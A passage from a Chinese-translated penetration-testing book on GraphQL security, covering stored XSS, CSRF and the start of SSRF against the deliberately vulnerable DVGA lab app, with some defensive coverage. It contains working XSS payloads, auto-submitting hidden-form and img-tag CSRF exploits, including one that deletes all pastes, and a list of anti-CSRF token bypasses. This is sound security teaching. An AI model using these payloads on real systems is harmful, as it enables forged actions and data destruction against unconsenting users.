  \ Public Pastes 页面。你应该会收到弹出消息，如图 8-15 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_242_0.png)\n\
  \n图 8-15：通过恶意 mutation 触发的 XSS 有效载荷\n\n让我们回顾一下这里发生了什么。我们首先使用 createPaste 创建了一个新的\
  \ paste，将恶意的 JavaScript 有效载荷提供给 mutation 的 content 参数。然后 API 将新 paste 存储在数据库中。因为我们的客户端正在使用\
  \ WebSocket 协议上的 GraphQL subscription 操作，并且订阅是实时的，所以我们立即看到我们创建的新 paste，其中包含恶意的 JavaScript\
  \ 代码。这是一个存储型 XSS 漏洞的示例。\n\n## 在文件上传功能中寻找反射型 XSS\n\n现在我们将探索使用文件上传功能创建新 paste。这应该能让你了解\
  \ GraphQL 中的文件上传看起来如何，以及它们是否可能容易受到 XSS 攻击。将以下文本文件下载到你的计算机：https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch08/paste_from_file.txt。\n\
  \n在 DVGA 中打开 Upload Paste 页面以上传文本文件。此文件最终将被存储在数据库中。点击 Choose File 并选择你下载的文件；然后点击\
  \ Upload。\n\n你可以使用 Burp Suite 在点击 Upload 按钮之前拦截请求，以查看 GraphQL mutation 的样子。或者使用浏览器开发者工具中的\
  \ Network 选项卡。图 8-16 显示了 Burp Suite 中的 mutation。\n\n```\nPOST /graphql HTTP/1.1\n\
  Host: 127.0.0.1:5013\nContent-Length: 360\nsec-ch-ua: \"Not/A Brand\";v=\"8\", \"\
  Chromium\";v=\"102\"\nAccept: application/json\nContent-Type: application/json\n\
  sec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\
  \ (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36\nsec-ch-ua-platform: \"\
  Linux\"\nOrigin: http://127.0.0.1:5013\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode:\
  \ cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:5013/upload_paste\nAccept-Encoding:\
  \ gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: ev-graphql: disable\n\
  Connection: close\n\n{\n  \"query\": \"mutation UploadPaste ($filename: String!,\
  \ $content: String!) {\\n    uploadPaste(filename: $filename, content:$content)\\\
  n  }\\n\",\n  \"variables\": {\n    \"content\":\"<h3>Uploaded Paste</h3><p>This\
  \ is an example paste from a file.</p>\\n<script>alert(\\\"Black Hat GraphQL\\\"\
  )</script>\\n\",\n    \"filename\":\"file.txt\"\n  }\n}\n```\n\n图 8-16：Burp Suite\
  \ 中的 UploadPaste mutation\n\n正如你所见，我们正在使用 UploadPaste 使用本地文件创建一个新 paste。你还可以看到我们作为\
  \ HTTP POST JSON 有效载荷的一部分传递了两个变量，content 和 filename。content 键包含上传文件中存在的数据，而 filename\
  \ 键是服务器将在磁盘上设置的文件名。\n\n有效载荷定义了 HTML 标题（<h3>）、段落（<p>）和调用 alert 函数并使用字符串 Black Hat\
  \ GraphQL 的 JavaScript script 标签（<script>）。此信息将被浏览器渲染，并且由于使用了 alert，一个弹出窗口将出现，确认我们能够通过\
  \ XSS 注入运行 JavaScript。\n\n在将此查询发送到服务器后（确保在 Burp Suite 中点击 Forward 来执行此操作），我们可以通过导航到\
  \ Private Pastes 页面来查看新上传的文件。你应该能够看到 JavaScript 弹出窗口，如图 8-17 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_244_0.png)\n\
  \n图 8-17：paste 代码在浏览器中执行并触发 alert 窗口。\n\n我们能够通过使用 UploadPaste 上传包含 JavaScript 和\
  \ HTML 代码的恶意文本文件来触发存储型 XSS 漏洞。\n\n## 总结\n\n在本章中，我们仔细研究了注入漏洞，从影响数据库和操作系统的漏洞到影响客户端浏览器的漏洞，包括经典和盲\
  \ SQLi；反射型、存储型和 DOM-based XSS；以及 OS 命令注入。\n\n当 GraphQL API 未能仔细验证输入时，可能会出现许多问题。我们确定了\
  \ GraphQL 中的各种输入入口点——从查询、字段和指令参数到操作名——所有这些都构成了注入攻击面。注入漏洞可能对应用程序数据造成毁灭性影响，虽然框架通过提供可重用的安全方法变得更好地保护它们，但它们至今仍然普遍存在。\n\
  \n## 9\n\n## 请求伪造和劫持\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_246_0.png)\n\n\
  当攻击者对服务器和客户端执行劫持和伪造攻击时，他们可以执行具有潜在毁灭性后果的敏感操作。在本章中，我们将测试这些漏洞并了解应用程序可能实施的防御措施，以减轻此类缺陷。\n\
  \n*请求伪造* 发生在攻击者能够代表客户端或服务器执行操作时，最好是敏感操作。当攻击者针对客户端时，他们可能会例如试图强制客户端将资金转移到他们控制的数字钱包或银行账户。当攻击者针对服务器时，他们可能反而旨在获取敏感的服务器端数据、探测隐藏或内部服务、向受限网络发出内部请求、访问与云环境相关信息等。相比之下，*劫持*\
  \ 指的是窃取另一用户的会话的能力。\n\n在 GraphQL 的上下文中，每种攻击向量都构成了威胁。我们将讨论这些攻击可以采取的三种形式：跨站请求伪造（CSRF）、服务器端请求伪造（SSRF）和跨站\
  \ WebSocket 劫持（CSWSH）。\n\n## 跨站请求伪造\n\n通常读作 sea-surf，CSRF 是一种客户端攻击，导致受害者在他们已通过身份验证的网站上执行不需要的操作。在此类攻击中，攻击者编写代码并将其嵌入他们运营的网站（有时在允许他们这样做的第三方网站中）。然后他们通过利用社会工程等攻击迫使受害者访问该网站。当代码在受害者浏览器中执行时，它会伪造并向服务器发送请求。\n\
  \n更常见的是，这些请求执行状态更改操作。它们可能会更新账户的电子邮件或密码，从一个账户向另一个账户转账，禁用账户安全设置如多因素身份验证，授予权限，甚至向应用程序添加新账户。图\
  \ 9-1 举例说明了典型的 CSRF 攻击流程，以银行网站为例。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_247_0.png)\n\
  \n图 9-1：CSRF 攻击的流程\n\nCSRF 利用了这样一个事实：当客户端登录到应用程序时，浏览器会在其发出的每个 HTTP 请求中向站点发送必要的信息，例如会话\
  \ cookie（在 Cookie 头中），以及 Host 或 User-Agent 等标准头。Web 服务器无法区分合法请求和由用户\n\n\n被欺骗，这就是为什么在没有缓解措施防止它们的情况下\
  \ CSRF 攻击会很有效。\n\n攻击者使用多种技术来实现 CSRF，但一个常见策略依赖于使用 <form> 标签创建的特殊 HTML 表单。攻击者等待用户在其网站上提交表单，或者为了提高成功率，使用\
  \ JavaScript 代码自动执行。当条件允许攻击者使用 GET 方法执行 CSRF 攻击时，他们还可能使用 <a> 和 <img> 等 HTML 标签作为载体。这些通常不被认为有害的标签，可以为攻击者提供在允许插入图像链接和超链接的网站中嵌入\
  \ CSRF 有效载荷的选项。这些标签只能发出纯 GET 请求，因此如果网站已实施反 CSRF 令牌，攻击可能不会成功。\n\n> NOTE\n> HTML 表单只能使用\
  \ HTTP 方法 GET 和 POST。其他潜在的改变状态的方法，例如 DELETE 或 PUT，不受支持。\n\n由于 CSRF 攻击依赖于受害者的已认证会话，攻击者只能执行受害者在网站上被允许执行的操作。例如，如果受害者登录了银行网站但每天只能转账\
  \ $1,000，CSRF 攻击将仅限于转账该金额。此外，如果某个请求需要客户端会话没有的管理员级权限，该请求将失败。第 7 章提供了绕过某些 GraphQL\
  \ 授权控制的技术。\n\nCSRF 至少已有二十年历史。我们能找到的第一个带有分配 CVE 标识符的 CSRF 相关漏洞 CVE-2002-1648 是 2002\
  \ 年的，尽管有些人认为 CSRF 漏洞可能早在 2001 年就已存在。对于 GraphQL 来说，开发人员可能会使用查询或变更来构建支持执行敏感操作（例如更改账户设置或从一个账户向另一个账户转账）的模式。这可能允许攻击者执行改变状态的操作。正如你所学到的，改变状态的操作通常使用变更来完成。然而，开发人员可能会选择使用查询来实现这些操作。\n\
  \n## 定位改变状态的操作\n\n改变状态的操作会以某种方式改变应用程序。例如，将 DVGA 的模式从 Beginner 更改为 Expert，或反之亦然，被视为改变状态的操作。如果你正在寻找\
  \ CSRF，你应该针对这些操作。正如你现在所知，GraphQL 中的改变状态操作通常使用变更来执行。然而，你有时可以通过使用 GraphQL 查询来执行改变状态的写入操作。\n\
  \n让我们从更可能的场景开始：基于变更识别改变状态的操作。为了找到有影响力的 CSRF 漏洞，尝试提取可用变更的列表并搜索那些能让你在应用程序中获得立足点或允许你提升现有权限的变更。清单\
  \ 9-1 中显示的 introspection 查询应返回模式中存在的变更字段。\n\n```\nquery {\n  __schema {\n    mutationType\
  \ {\n      fields {\n        name\n      }\n    }\n  }\n}\n```\n\nListing 9-1: Introspection\
  \ query to extract mutation field names\n\n继续使用 Altair 运行此查询针对 DVGA，确保 DVGA 的模式设置为\
  \ Beginner。你应该能识别出一些改变状态的操作，例如 createUser、importPaste、editPaste、uploadPaste、deletePaste\
  \ 和 createPaste。\n\n在你没有注意到任何敏感操作的情况下，下一步要寻找的是你是否可以使用查询来执行改变状态的操作。GraphQL 服务器有时支持通过\
  \ GET 进行操作，并且当它们这样做时，它们可能会有意拒绝基于 GET 的变更以仅允许使用 GET 进行读取操作。这在一定程度上提供了防止 CSRF 类漏洞的保护，正如本章后面将学习的那样。然而，如果我们的目标使用任何基于\
  \ GET 的查询来执行重要的状态更改，则该缓解措施就无用了。执行清单 9-2 中显示的 introspection 查询以获取可用查询的名称。\n\n```\n\
  query {\n  __schema {\n    queryType {\n      fields {\n        name\n      }\n\
  \    }\n  }\n}\n```\n\nListing 9-2: Introspection query to extract query field names\n\
  \n以下是返回列表的摘录：\n\n```\n{\n  \"name\": \"search\"\n},\n{\n  \"name\": \"audits\"\n\
  },\n{\n  \"name\": \"deleteAllPastes\"\n}\n--snip--\n```\n\n是否有任何查询名称引起注意？该列表有几个潜在的改变状态查询，但\
  \ deleteAllPastes 特别有趣。删除所有粘贴的查询更适合作为变更而不是查询。然而，由于此应用程序存在漏洞，它没有考虑 CSRF 问题。\n\n##\
  \ 测试基于 POST 的漏洞\n\n现在我们已经识别出一些改变状态的查询和变更，我们可以尝试制作一个利用它们的 HTML 表单。我们的攻击可能会诱骗用户点击一个链接，将他们重定向到包含类似清单\
  \ 9-3 的表单的恶意网站。提交后，它将使用 createPaste 变更向 DVGA 发出 POST 请求。\n\n```\n<html>\n<h1>Click\
  \ the button below to see the proof of concept!</h1>\n<body>\n    <form id=\"auto_submit_form\"\
  \ method=\"POST\" action=\"http://localhost:5013/graphql\">\n        <input type=\"\
  hidden\" name=\"query\" value=\"mutation { createPaste(title:&quot;CSRF&quot;, content:&quot;content&quot;;\
  \ public:true, burn: false) { paste { id content title burn } }}\"/>\n        <input\
  \ type=\"submit\" value=\"Submit\">\n    </form>\n</body>\n<html>\n```\n\nListing\
  \ 9-3: HTML-form POST-based CSRF exploit\n\n我们使用 method 属性定义一个名为 query 的基于 POST\
  \ 的表单。此表单将向在 action 属性中定义 DVGA 的 URL 发出请求。你会注意到我们还通过将 type 属性设置为 hidden 定义了一个隐藏的\
  \ <input> 标签。这确保了用于执行查询的表单对受害者保持不可见；它不会显示在其浏览器中。我们在 value 属性中编码并定义 GraphQL 变更。变更的解码版本如下所示：\n\
  \n```\nmutation {\n    createPaste(title: \"CSRF\", content: \"content\", public:\
  \ true, burn: false) {\n        paste {\n            id\n            content\n \
  \           title\n            burn\n        }\n    }\n}\n```\n\n要观察此表单在攻击中如何工作，请从书籍的\
  \ GitHub 仓库 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit.html\
  \ 下载 CSRF 概念验证代码。将此文件保存到 Kali 的桌面，扩展名为 .html。\n\n接下来，让我们使用 Burp Suite 查看 CSRF 攻击中发送的传出请求。启动\
  \ Burp Suite 并通过点击 Open Browser 打开其内置浏览器。确保它当前设置为不拦截请求。然后，将 HTML 文件从桌面拖放到浏览器窗口中。你应该会看到图\
  \ 9-2 中显示的 Submit 按钮。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_251_0.png)\n\n\
  Figure 9-2: A POST-based CSRF example\n\n在 Burp 中，将 Intercept 按钮切换为 Intercept Is\
  \ On。现在，点击表单中的 Submit 并观察 Burp 的 Proxy 选项卡中产生的请求。它应该类似于图 9-3。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_251_1.png)\n\
  \nFigure 9-3: The POST request sent from a victim’s browser after a CSRF attack\n\
  \n正如你所见，变更被编码并作为单个值发送到 query 正文参数。这是因为基于 POST 的 HTML 表单将 <input> 标签转换为 HTTP 正文参数，而我们使用了名为\
  \ query 的 input 标签。\n\n由于 HTML 表单不能在没有 JavaScript 等语言帮助的情况下发送 JSON 格式的数据，提交的变更不是作为\
  \ JSON 发送的，正如 Content-Type 头部所示。在这里，它设置为 application/x-www-form-urlencoded 而不是 application/json。即使如此，一些\
  \ GraphQL 服务器仍可能在后端将有效载荷转换回 JSON，尽管缺少正确的 Content-Type 头部。\n\n当 HTML 表单使用 POST 方法时，我们可以使用以下三种编码类型之一对数据进行编码：application/x-www-form-urlencoded、multipart/form-data\
  \ 或 text/plain。默认情况下，当 enctype 属性未设置时，如我们的 exploit 代码中那样，表单使用 application/x-www-form-urlencoded，它在发送到服务器之前对所有字符进行编码。现在你已经看到\
  \ CSRF exploit 如何触发 GraphQL 查询，点击 Forward 将其发送到服务器。\n\n## 自动提交 CSRF 表单\n\n诱使用户点击按钮可能会带来挑战。如果用户犹豫不决并且没有继续进行，我们的攻击就会失败。如果我们可以在他们访问页面时自动提交表单怎么办？这可以用\
  \ JavaScript 代码实现。清单 9-4 在有人访问页面后两秒执行表单。\n\n```\nasync function csrf() {\n    for\
  \ (let i = 0; i < 2; i++) {\n        await sleep(i * 1000);\n    }\n    document.forms['auto_submit_for'].submit();\n\
  }\n```\n\nListing 9-4: Automatic form submission with JavaScript\n\n两秒的延迟是为了给你一些时间来理解你所看到的内容。在现实世界场景中，你希望立即代表受害者伪造请求，而没有任何延迟。\n\
  \n要亲眼看到此攻击，请将文件 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/post_csrf_submit_auto.html\
  \ 下载到 Kali 的桌面。接下来，打开 Burp 的拦截模式；然后将下载的文件拖放到浏览器中。一旦你拖放它，消息 This form is going to\
  \ submit itself in 2 seconds 应该会出现。接下来，你应该在 Burp 中看到被拦截的 POST 请求。如果你点击 Forward，你应该在浏览器中看到来自\
  \ GraphQL API 的响应，表明变更导致创建了一个新的粘贴，包括一些元数据，如粘贴的 ID、标题等。\n\n要验证粘贴创建是否确实有效，打开 DVGA\
  \ 用户界面 http://localhost:5013 并访问 Public Pastes 页面。你应该会看到图 9-4 中显示的新创建的粘贴。\n\n\n\n\
  \n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_253_0.png)\n\nFigure 9-4: A paste created\
  \ via a CSRF attack\n\nCongratulations! You just simulated forging a paste mutation\
  \ on behalf of a victim.\n\n## Testing for GET-Based Vulnerabilities\n\nMany GraphQL\
  \ implementations forbid any use of GET, but sending mutations by using the GET\
  \ method is especially taboo, because it’s considered a security risk that could\
  \ lead to CSRF vulnerabilities, as you’ve learned. More often than not, GraphQL\
  \ servers will reject any incoming queries that use a mutation over the GET method.\
  \ To test whether a GraphQL server supports them, you could send a cURL command\
  \ like this one:\n\n```\n# curl -X GET \"http://localhost:5013/graphql?query=mutation%20%7B%20__typename%20%7D\"\
  \n```\n\nThe %20 indicates spaces, %7B and %7D are the URL-encoded opening and closing\
  \ curly brackets ({}) of the mutation query, and the plus sign (+) is an encoded\
  \ space. When sent to DVGA, the response to this cURL command is as follows:\n\n\
  ```\n{\"errors\":[{\"message\":\"Can only perform a mutation operation from a POST\
  \ request.\"}]}\n```\n\nAs you can see, DVGA does not allow mutations using the\
  \ GET method. However, in penetration tests, assume that nothing is off the table\
  \ and test all hypotheses, because you never know when you will run into a completely\
  \ custom GraphQL implementation that deviates from the standard.\n\nGET-based CSRF\
  \ attacks are somewhat more interesting than POST-based ones because applications\
  \ often won’t implement anti-CSRF protections on GET requests. This is because state-changing\
  \ actions typically use other HTTP methods. If a server allows mutations over GET,\
  \ we could exploit the HTML anchor (<a>) tag with the hypertext reference attribute\
  \ (href) to build a hyperlink that will send the mutation to the server. The anchor\
  \ tag executes only GET-based requests, which is why it isn’t a great candidate\
  \ for POST-based CSRF exploitation:\n\n```\n<a href=\"http://localhost:5013/graphql?query=mutation{someSensitiveAction}\"\
  \ />\n```\n\nAlternatively, we could use image tags (<img>) with the source (src)\
  \ attribute to embed our mutation, like so:\n\n```\n<img src=\"http://localhost:5013/graphql?query=mutation{someSensitiveAction}\"\
  \ />\n```\n\nThis technique works on any platform that lets you specify innocent-looking\
  \ HTML tags such as <a> and <img>. Thus, in addition to tricking victims to visit\
  \ an attacker-controlled website containing these links, you might be able to use\
  \ them in legitimate websites that accept URLs and render the links on the client\
  \ side. As a result, clients will make direct GET requests to another site chosen\
  \ by the attacker.\n\nAlthough we can't send mutations to DVGA by using the GET\
  \ method, we can try using GET to send the state-changing query deleteAllPastes.\
  \ As the name implies, the deleteAllPastes query will delete all pastes in the server's\
  \ database. We can exploit this query by using either GET or POST.\n\nTo perform\
  \ such a CSRF attack, this HTML file uses <form> tags to submit the query. JavaScript\
  \ code defined using the <script> HTML tags makes the request automatically, as\
  \ soon as the victim loads the page:\n\n```\n<html>\n<body>\n<h1>This form is going\
  \ to submit itself in 2 seconds...</h1>\n<form id=\"auto_submit_form\" method=\"\
  GET\" action=\"http://localhost:5013/graphql\">\n<input type=\"hidden\" name=\"\
  query\" value=\"query { deleteAllPastes }\"/>\n<input type=\"submit\" value=\"Submit\"\
  >\n</form>\n</body>\n\n<script>\nfunction sleep(ms) {\n  return new Promise(resolve\
  \ => setTimeout(resolve, ms));\n}\n\nasync function csrf() {\n  for (let i = 0;\
  \ i < 2; i++) {\n    await sleep(i * 1000);\n  }\n  document.forms['auto_submit_form'].submit();\n\
  }\n\ncsrf();\n\n</script>\n</html>\n```\n\nTo test this attack, save the file at\
  \ https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/get_csrf_submit_auto.html\
  \ to your desktop as an HTML file. Make sure Burp Suite is intercepting traffic,\
  \ and then drag\n\nand drop the HTML file into your browser window. You should see\
  \ the outbound HTTP GET request sent after two seconds:\n\n```\nGET /graphql?query=query+%7B+deleteAllPastes+%7D\
  \ HTTP/1.1\nHost: localhost:5013\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;\
  \ x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n\
  --snip--\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection:\
  \ close\n```\n\nWe’re able to use CSRF to forge a GET-based query that deletes all\
  \ pastes. Now let’s try using HTML tags such as <a> and <img> to trigger a GET-based\
  \ CSRF. One way to do this is to create an HTML page that performs a GET request\
  \ using an <img> tag, such as the one in Listing 9-5.\n\n```\n<html>\n<body>\n<h1>GET-based\
  \ CSRF using an image tag</h1>\n<img src=\"http://localhost:5013/graphql?query={deleteAllPastes}\"\
  \ style=\"display: none;\" />\n</body>\n</html>\n```\n\nListing 9-5: GET-based CSRF\
  \ using image tags\n\nSave this as an HTML file. As before, it will execute as soon\
  \ as the page loads, because the browser will try to fetch the URL defined using\
  \ the src attribute and send a GraphQL query.\n\n## Using HTML Injection\n\nA second\
  \ way we could exploit GET-based CSRF is by abusing another vulnerability, such\
  \ as HTML injection, which allows an attacker to inject HTML tags into a web page.\
  \ If a victim visits the site, their browser will render the HTML code. In particular,\
  \ if an attacker is able to inject a hyperlink using the <a> tag or an image link\
  \ using the <img> tag, clients will initiate the GET request when they visit the\
  \ page, following the tags’ default behavior.\n\nCan we trigger CSRF on DVGA using\
  \ HTML injection? Let’s find out. Open Firefox, navigate to http://localhost:5013,\
  \ and go to the Public Pastes page. Next, open Developer Tools (CTRL-SHIFT-I) and\
  \ go to the Network tab. Ensure that Altair is pointing to http://localhost:5013/graphql\
  \ and enter the mutation in Listing 9-6, which will create a new paste with a CSRF\
  \ payload as its content.\n\n```\nmutation {\n  createPaste(content:\"<img src=\\\
  \"http://localhost:5013/graphql?query={ deleteAllPastes }\\\" /></img>\", title:\"\
  CSRF using image tags\", public: true, burn: false) {\n    paste {\n      id\n \
  \     content\n```\n```\n}\n}\n}\n```\n\n# Listing 9-6: Creating a paste containing\
  \ a CSRF payload\n\nThis request injects the <img> tag containing the deleteAllPastes\
  \ query into the Public Pastes page. To do so, it relies on the fact that DVGA fetches\
  \ paste data by using GraphQL subscriptions (with WebSocket as the transport protocol).\
  \ Your browser subscribes to new paste-creation events, so whenever a new paste\
  \ is created, the subscription automatically populates the page with its title,\
  \ content, and other information. By putting our payload in the createPaste content\
  \ field, we effectively embed it on the page.\n\nNow, when clients send queries\
  \ using createPaste and the content field, they will render the payload. Take a\
  \ close look at what happens in your Network tab once you send the query. You should\
  \ see the outbound GET request shown in Figure 9-5.\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_256_0.png)\n\
  \n## Figure 9-5: A GET-based query sent through an HTML image tag containing a CSRF\
  \ payload\n\nIf you refresh your browser, you should no longer see any pastes, as\
  \ the CSRF attack should have deleted them. Click Rollback DVGA, located in the\
  \ top-right drop-down menu, to restore the server to its original state.\n\nWe’ve\
  \ discussed GET- and POST-based CSRF attacks. We’ve also discussed how some GraphQL\
  \ servers attempt to prevent CSRF by rejecting mutations using the GET method, and\
  \ how to test for those as well. Next, let’s use BatchQL and GraphQL Cop to automatically\
  \ flag GraphQL servers that might be vulnerable to CSRF.\n\n## Automating Testing\
  \ with BatchQL and GraphQL Cop\n\nBatchQL has multiple CSRF-related test cases.\
  \ Let’s run it against DVGA to see what information we’re able to get about its\
  \ CSRF vulnerabilities:\n\n```\n# cd ~/batchql\n# python3 batch.py -e http://localhost:5013/graphql\
  \ | grep -i CSRF\n\nCSRF GET based successful. Please confirm that this is a valid\
  \ issue.\nCSRF POST based successful. Please confirm that this is a valid issue.\n\
  ```\n\nAs you can see, we used grep with the -i flag to filter out results unrelated\
  \ to CSRF vulnerabilities. BatchQL detected that both GET and POST allow non-JSON-based\
  \ queries.\n\nGraphQL Cop is similar to BatchQL in the way it tests for CSRF vulnerabilities,\
  \ except it additionally tests whether the server supports mutations over GET:\n\
  \n```\n# cd ~/graphql-cop\n# python3 graphql-cop.py -t http://localhost:5013/graphql\
  \ | grep -i CSRF\n\n[MEDIUM] GET Method Query Support - GraphQL queries allowed\
  \ using the GET method (Possible Cross Site Request Forgery (CSRF))\n[MEDIUM] POST\
  \ based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over\
  \ POST (Possible Cross Site Request Forgery)\n```\n\nAutomated tools may introduce\
  \ false positives, so we recommend always manually verifying that their results\
  \ are accurate.\n\n## Preventing CSRF\n\nIn the years since CSRF was discovered,\
  \ browser vendors such as Mozilla and Google have significantly improved their CSRF\
  \ mitigations. Various open source web server frameworks have also made CSRF vulnerabilities\
  \ tremendously harder to exploit. This section explains the CSRF mitigations that\
  \ exist today at the browser and server levels.\n\n## The SameSite Flag\n\nBrowsers\
  \ have started supporting a special HTTP cookie attribute called SameSite. This\
  \ attribute allows developers to decide whether the client browser should attach\
  \ the cookie when making cross-site requests. To set this cookie attribute, the\
  \ application needs to set a Set-Cookie response header. This interferes with a\
  \ CSRF attack’s attempt to send a request from the attacker website (say, attacker.com)\
  \ to a target website of interest (banking.com).\n\nOne challenge with using the\
  \ SameSite attribute is that older browsers may not support it. However, most of\
  \ the modern browsers do. Mozilla’s Developer website has a dedicated section about\
  \ SameSite browser support that developers can use as a reference.\n\n\n\n\n\nSameSite\
  \ cookie 属性接受三个值：\n\n- **Strict** 仅在用户在同一源内浏览时发送 cookie\n- **Lax** 仅当请求使用 HTTP GET\
  \ 且未由脚本发起，例如顶级导航时发送 cookie\n- **None** 在跨站请求中发送 cookie，实际上不提供任何保护\n\n设置了 SameSite\
  \ 属性的 cookie 的 GraphQL 服务器会返回一个 Set-Cookie HTTP 响应头：\n\n```\nSet-Cookie: session=mysecretsession;\
  \ SameSite=Strict\n```\n\n当网站设置 cookie 时未指定 SameSite 属性，现代浏览器如 Chrome 会假定其设置为 Lax。当\
  \ cookie 设置为 Strict 时，如果发生 CSRF 攻击，cookie 不会在跨站请求中发送。\n\n## 反 CSRF 令牌\n\n为了在服务器级别防止\
  \ CSRF 漏洞，Web 框架引入了 *反 CSRF 令牌*。这些是在服务器上生成的难以猜测、密码学强度高且唯一的字符串。服务器期望客户端在每次请求中传递反\
  \ CSRF 令牌。当服务器看到没有此类令牌的传入请求时，服务器会拒绝该请求。\n\n服务器可以按请求生成反 CSRF 令牌，或为用户会话的生命周期生成一次。按请求生成令牌是更强的缓解措施且更难击败，因为它减少了攻击者获取有效令牌的时间。一旦令牌失效，服务器不应再接受它。\n\
  \n客户端通常通过使用 HTTP 请求头，例如 X-CSRF-TOKEN，或在 HTTP 正文参数中，例如 csrf-token，将反 CSRF 令牌发送到服务器。许多\
  \ Web 框架都内置了 CSRF 保护支持，使开发人员能够在无需从头实现 CSRF 防御的情况下构建安全应用程序。以下是包含反 CSRF 令牌的示例 HTTP\
  \ 请求：\n\n```\nPOST /graphql HTTP/1.1\nHost: localhost:5013\nContent-Length: 19\n\
  Content-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows\
  \ NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45\
  \ Safari/537.3\n\nquery=mutation%7BcreatePaste%28title%3A%22CSRF%22%2Ccontent%3A%22content%22%2Cpublic%3Atrue%2Cburn%3Afalse%29%7Bpaste%7Bid+content+title+burn%7D%7D&csrf-token=asj2nrcs82kssadis\n\
  ```\n\n重要的是要记住，就像任何其他安全控制一样，如果实现不正确，令牌也会被击败。以下是攻击者可能绕过反 CSRF 令牌的几种方式：\n\n- **删除\
  \ CSRF 令牌值。** 一些反 CSRF 实现在 CSRF 参数存在但未设置值时可能会失败，导致值为 null。\n- **完全删除 CSRF 参数和令牌值。**\
  \ 一些反 CSRF 实现在参数未设置时可能会失败。\n- **在后续请求中重用 CSRF 令牌。** 如果攻击者能够捕获一个有效的反 CSRF 令牌，例如属于其自己的会话的令牌，并且服务器不使已使用的令牌失效，则有可能在\
  \ CSRF 攻击中重用该令牌。\n- **用相同字符长度的随机字符串替换 CSRF 令牌。** 一些服务器可能只是查看令牌值并检查其长度。如果长度等于正常令牌的长度（例如\
  \ 14 个字符），它们可能会让请求通过。\n- **暴力破解 CSRF 令牌。** 一些 CSRF 令牌在密码学上可能很弱，使攻击者能够暴力破解它们。例如，它们可能长度较短，使用可预测的模式，或采用弱的加密算法。\n\
  \n浏览器和服务器级别的 CSRF 保护结合起来遵循纵深防御安全原则，使 CSRF 对攻击者更难利用。\n\n## 服务器端请求伪造\n\n*SSRF* 允许攻击者代表受影响的服务器执行请求。使用\
  \ SSRF，攻击者可以强制服务器连接到内部服务，通常提供对受限网络区域、内部 API 和敏感数据的访问。Web 应用程序可以通过多种方式引入 SSRF。经常，应用程序会向客户端公开功能，从客户端获取输入并使用它来执行特定操作。例如，考虑一个应用程序允许用户提供他们喜欢的照片的\
  \ URL，该照片来自特定网站，例如 *imgur.com*。应用程序然后下载照片并通过电子邮件作为附件发送给用户。\n\n在此示例中，应用程序期望两个输入：包含图像的\
  \ *imgur.com* 的 URL，以及电子邮件地址。如果攻击者提供其他输入，例如像 *http://lab.blackhatgraphql.com/cat.png*\
  \ 这样的 URL 和像 *info@blackhatgraphql.com* 这样的电子邮件地址会怎样？如果应用程序没有通过例如确保 URL 的域名为 *imgur.com*\
  \ 来验证输入，那么一旦用户提交此信息，应用程序可能会改为尝试访问攻击者控制的网站，将图像下载到磁盘并保存到文件夹中。它可能会然后使用命令行实用程序或脚本将带有附件的电子邮件发送给用户。\n\
  \n攻击者还可以提供各种 URL 作为输入，包括包含私有、不可路由 IP 地址的 URL（例如 172.16.0.0/24 或 10.10.0.0/24）。如果服务器恰好存在于这些范围存在的网络上，它可能会对内部服务执行调用，例如数据库或网络上的内部网站，使攻击者能够读取他们本不应该能够访问的服务器的响应。攻击者还可以尝试猜测内部\
  \ URL，希望找到解析为内部地址的有效 URL（例如 internal.example.com、internal2.example.com 等）。\n\n随着云基础设施的采用，SSRF\
  \ 已成为黑客寻找的最大漏洞之一。这是因为许多云提供商托管元数据端点 URL，这些 URL 允许云实例读取有关其自身的信息，例如分配给实例的角色和正在使用的凭据。由于\
  \ SSRF 可能允许攻击者进行内部调用，因此它可能为他们提供获取有关易受攻击服务器的此敏感信息的能力。\n\n> NOTE 云元数据端点不在本书的讨论范围之内。你可以在\
  \ https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html\
  \ 阅读有关 AWS 元数据的更多信息，以及在 https://cloud.google.com/compute/docs/metadata/overview\
  \ 阅读有关 Google Cloud 元数据的更多信息。\n\n攻击者可以尝试对除 HTTP 之外的各种协议进行 SSRF，例如文件传输协议（FTP）、服务器消息块（SMB）、轻量级目录访问协议（LDAP）等。而且，就像其他\
  \ API 技术一样，GraphQL 也并非免疫于 SSRF 漏洞。\n\n### 了解 SSRF 的类型\n\n在执行 GraphQL 渗透测试时，你可能会遇到三种\
  \ SSRF 漏洞。就像你在第 8 章中学到的盲 SQL 注入一样，盲 SSRF 漏洞不会提供漏洞存在的具体视觉指示。相反，攻击者可能能够通过使用可以侦听各种协议消息的带外利用工具来推断漏洞的存在。\n\
  \n例如，回想一下我们之前讨论的 URL 图像获取服务。在利用盲 SSRF 时，攻击者可能能够通过在托管 lab.blackhatgraphql.com 的远程服务器上捕获流量来判断应用程序是否易受攻击。当攻击者提交\
  \ URL http://lab.blackhatgraphql.com/cat.png 时，应用程序可能在尝试通过 HTTP 执行图像获取之前在不同协议上发起某些连接，例如端口\
